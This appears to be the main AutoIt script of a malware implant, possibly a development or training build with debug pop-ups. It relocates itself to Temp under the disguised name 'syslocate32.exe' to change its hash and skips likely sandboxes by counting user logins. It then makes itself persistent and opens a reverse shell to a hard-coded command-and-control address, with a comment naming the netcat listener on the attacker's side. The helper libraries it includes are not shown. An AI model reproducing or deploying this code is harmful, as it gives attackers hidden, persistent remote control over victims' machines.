#include "libs/settings.au3"
#include "libs/network.au3"
#include "libs/info.au3"
#include "libs/misc.au3"

$c2server = "192.168.231.106"
$c2port = "432"
$Nlogon = 2

init()

if InternetCheck()	Then

   MessageBox("Debug","Internet is up!")

   Move2Temp("syslocate32.exe")

	  MessageBox("Debug","Now I am running from Temp with a different HASH")

	  If numberOfLogins(whoami()) > 2 Then

		 MessageBox("Debug","Current user login more than " & $Nlogon)

		 MessageBox("Debug","Not a Sandbox!")

		 SetPersistent4CurrentUser()

		 MessageBox("Debug","Now I am persistent for current user")

		 ;server side run "nc -lp 432"
		 MessageBox("Debug","Opening remote shell to " & $c2server & ":" & $c2port)
		 ReverseShell($c2server, $c2port)

	  EndIf

EndIf
